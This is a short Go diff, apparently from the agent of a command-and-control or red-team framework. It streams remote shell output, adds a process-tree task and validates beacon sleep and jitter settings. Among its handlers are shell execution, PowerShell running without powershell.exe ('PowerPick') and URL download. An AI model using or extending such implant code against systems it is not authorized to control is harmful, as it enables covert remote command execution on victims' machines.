@@ -15,7 +15,11 @@ import (
 )
 
 func handleShell(task Task, res *TaskResult) {
-	out, err := runShell(task.Command, task.Shell)
+	// Streaming: deltas become Partial results after the 3 s first-flush gate
+	// inside runShellStreaming; fast commands never emit a single partial.
+	out, err := runShellStreaming(task.Command, task.Shell, func(delta string) {
+		enqueuePartialResult(task, delta)
+	})
 	if err != nil {
 		res.Error = err.Error()
 	}
@@ -33,6 +37,16 @@ func handlePS(task Task, res *TaskResult) {
 		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
 		res.Encoding = "base64"
 	}
+}
+
+func handleProcessTree(task Task, res *TaskResult) {
+	out, err := getProcessTree()
+	if err != nil {
+		res.Error = err.Error()
+		return
+	}
+	res.Output = base64.StdEncoding.EncodeToString([]byte(out))
+	res.Encoding = "base64"
 }
 
 func handlePowerPick(task Task, res *TaskResult) {
@@ -128,11 +142,12 @@ func handleDownloadURL(task Task, res *TaskResult) {
 
 func handleSetSleep(task Task, res *TaskResult) {
 	parts := strings.Split(task.Command, ",")
-	if len(parts) >= 1 {
-		if i, err := strconv.Atoi(strings.TrimSpace(parts[0])); err == nil && i > 0 {
-			IntervalStr = strconv.Itoa(i)
-		}
+	i, err := strconv.Atoi(strings.TrimSpace(parts[0]))
+	if err != nil || i <= 0 {
+		res.Error = "sleep interval must be a positive integer (seconds)"
+		return
 	}
+	IntervalStr = strconv.Itoa(i)
 	if len(parts) >= 2 {
 		if j, err := strconv.Atoi(strings.TrimSpace(parts[1])); err == nil {
 			JitterStr = strconv.Itoa(j)
